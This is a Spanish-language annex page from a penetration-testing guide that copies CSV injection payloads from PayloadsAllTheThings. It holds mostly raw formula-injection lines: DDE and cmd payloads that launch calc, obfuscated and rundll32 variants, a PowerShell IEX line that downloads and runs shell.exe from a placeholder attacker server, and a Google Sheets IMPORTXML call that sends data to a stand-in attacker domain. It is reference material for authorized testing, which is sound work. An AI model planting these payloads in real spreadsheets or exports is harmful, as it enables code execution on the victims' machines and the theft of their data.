# Code injection / eval: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [CSV Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/CSV%20Injection/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. CSV Inyección / Metodología

```text
=
+
–
@
```

```text
    DDE ("cmd";"/C calc";"!A0")A0
    @SUM(1+1)*cmd|' /C calc'!A0
    =2+5+cmd|' /C calc'!A0
    =cmd|' /C calc'!'A1'
```

```text
    =cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
```

```text
    =AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
    =cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
    =         cmd|'/c calc.exe'!A
```

```text
    =rundll32|'URL.dll,OpenURL calc.exe'!A
    =rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A
```

```text
    =    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
```

### Variantes presentes en tablas o texto del apartado

```text
/C
```

## 2. Metodología / Google Sheets

```text
=IMPORTXML("http://[ATTACKER.DOMAIN.TLD]/csv", "//a/@href")
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
